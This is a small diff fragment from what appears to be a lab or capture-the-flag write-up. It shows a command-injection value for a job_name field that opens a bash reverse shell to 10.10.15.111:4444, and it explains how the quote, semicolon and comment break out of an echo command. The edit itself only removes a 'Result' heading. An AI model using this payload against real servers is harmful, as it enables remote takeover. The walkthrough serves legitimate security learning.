@@ -552,8 +552,6 @@ job_name = "'; bash -c 'bash -i >& /dev/tcp/10.10.15.111/4444 0>&1'; #"
 ```
 
 When interpolated into `echo 'Archive: {job_name}' >> /tmp/archive.log`, the leading `'` closes the server's `echo` string, `;` separates statements, `bash -c '...'` spawns the reverse shell, and `#` comments out the trailing redirect — producing three valid shell statements.
-
-**Result:**
 <div align="center">
 <br>
 <br>
